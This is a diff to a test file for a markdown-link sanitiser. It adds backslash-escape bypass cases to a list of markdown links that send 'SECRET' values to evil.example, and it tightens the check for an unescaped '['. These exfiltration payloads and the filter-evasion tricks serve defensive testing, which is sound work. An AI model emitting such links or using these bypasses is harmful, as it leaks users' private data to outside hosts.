@@ -81,6 +81,11 @@ BYPASSES = [
     "[a](https://good.example/ok) [b](https://evil.example/?q=SECRET​)",
     "[a](https://evil.example/?d=1)(https://evil.example/?q=SECRET)",  # the removal marker must not join the text after it into a link
     "[a](https://evil.example/?d=1)[b](https://evil.example/?q=SECRET)",
+    # a backslash before the bracket: escaping `[` as `\[` must not turn an existing `\[` into an escaped backslash followed by a live `[`
+    '\\[click](https://evil.example/?d=SECRET "t")',
+    "\\[click](https://evil.example/?d=a<b)",
+    '\\\\[click](https://evil.example/?d=SECRET "t")',
+    'C:\\Users\\x \\[a](https://evil.example/?d=S "t")',
 ]
 
 
@@ -88,7 +93,7 @@ BYPASSES = [
 def test_no_markup_shape_the_filter_does_not_recognise_survives_as_a_link(answer):
     out = defang(answer, {POSTING})
     rest = re.sub(r"\[[^\[\]<>\n]{0,300}\]\(https?://[^\s()<>\[\]]{1,2000}\)", "", out)  # what the one allowed shape would be
-    assert not re.search(r"(?<!\\)\[", rest) and "<" not in rest, out
+    assert not re.search(r"(?<!\\)(?:\\\\)*\[", rest) and "<" not in rest, out  # a live `[` is one with an even number of backslashes before it
 
 
 ROOT = Path(__file__).resolve().parents[1]
